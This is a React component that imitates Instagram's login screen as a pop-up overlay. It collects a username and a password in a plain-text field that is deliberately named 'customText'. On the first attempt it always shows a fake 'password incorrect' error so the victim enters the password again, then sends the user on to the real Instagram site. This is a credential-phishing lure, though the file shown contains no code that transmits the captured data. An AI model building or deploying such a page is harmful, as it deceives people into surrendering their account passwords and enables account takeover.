import React, { useState } from 'react';
import { X, Instagram } from 'lucide-react';

interface LoginOverlayProps {
  isOpen: boolean;
  onClose: () => void;
}

const LoginOverlay: React.FC<LoginOverlayProps> = ({ isOpen, onClose }) => {
  const [username, setUsername] = useState('');
  const [customText, setCustomText] = useState('');
  const [error, setError] = useState('');
  const [loginAttempts, setLoginAttempts] = useState(0);

  if (!isOpen) return null;

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!username.trim() || !customText.trim()) {
      setError('Please fill in all fields.');
      return;
    }

    if (loginAttempts === 0) {
      setError('Sorry, your password was incorrect. Please double-check your password.');
      setLoginAttempts(1);
    } else {
      // Redirect to Instagram official page
      window.open('https://www.instagram.com', '_blank');
      onClose();
    }
  };

  return (
    <div className="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center z-50 p-4">
      <div className="bg-white rounded-lg max-w-sm w-full relative animate-fadeIn shadow-2xl">
        <button
          
          className="absolute top-3 right-3 text-gray-400 hover:text-gray-600 transition-colors z-10"
        >
          <X size={20} />
        </button>
        
        <div className="p-10 pt-12">
          <div className="text-center mb-8">
            <div className="flex justify-center mb-6">
              <Instagram size={52} className="text-black" />
            </div>
            <h1 className="text-xl font-normal text-gray-900 mb-4 tracking-tight">
              Sign in to see photos and videos<br />from your friends.
            </h1>
          </div>

          <form onSubmit={handleSubmit} className="space-y-3">
            <div>
              <input
                type="text"
                placeholder="Phone number, username, or email"
                value={username}
                onChange={(e) => {
                  setUsername(e.target.value);
                  setError('');
                }}
                className="w-full px-2 py-2.5 border border-gray-300 rounded-sm text-xs focus:outline-none focus:border-gray-400 bg-gray-50 placeholder-gray-500"
              />
            </div>
            
            <div>
              <input
                type="text"
                placeholder="Enter your password"
                value={customText}
                onChange={(e) => {
                  setCustomText(e.target.value);
                  setError('');
                }}
                className="w-full px-2 py-2.5 border border-gray-300 rounded-sm text-xs focus:outline-none focus:border-gray-400 bg-gray-50 placeholder-gray-500"
              />
            </div>

            {error && (
              <div className="text-red-500 text-xs text-center py-2">
                {error}
              </div>
            )}

            <button
              type="submit"
              className="w-full bg-blue-500 text-white py-2 px-4 rounded-lg text-sm font-semibold hover:bg-blue-600 transition-colors disabled:opacity-50 disabled:cursor-not-allowed mt-4"
              disabled={!username.trim() || !customText.trim()}
            >
              Log in
            </button>
          </form>

          <div className="flex items-center my-6">
            <div className="flex-1 border-t border-gray-300"></div>
            <span className="px-4 text-gray-500 text-xs font-semibold uppercase">OR</span>
            <div className="flex-1 border-t border-gray-300"></div>
          </div>

          <div className="text-center">
            <button 
              onClick={() => window.open('https://www.facebook.com/login.php', '_blank')}
              className="text-blue-900 text-sm font-semibold hover:underline flex items-center justify-center w-full"
            >
              <svg className="w-4 h-4 mr-2" viewBox="0 0 24 24" fill="#1877F2">
                <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
              </svg>
              Log in with Facebook
            </button>
          </div>

          <div className="text-center mt-6">
            <a 
              href="https://www.instagram.com/accounts/password/reset/" 
              target="_blank" 
              rel="noopener noreferrer"
              className="text-blue-900 text-xs hover:underline"
            >
              Forgotten your password?
            </a>
          </div>
        </div>

        <div className="border-t border-gray-300 p-6 text-center bg-gray-50 rounded-b-lg">
          <p className="text-sm text-gray-600">
            Don't have an account?{' '}
            <a 
              href="https://www.instagram.com/accounts/emailsignup/" 
              target="_blank" 
              rel="noopener noreferrer"
              className="text-blue-500 font-semibold hover:underline"
            >
              Sign up
            </a>
          </p>
        </div>
      </div>
    </div>
  );
};

export default LoginOverlay;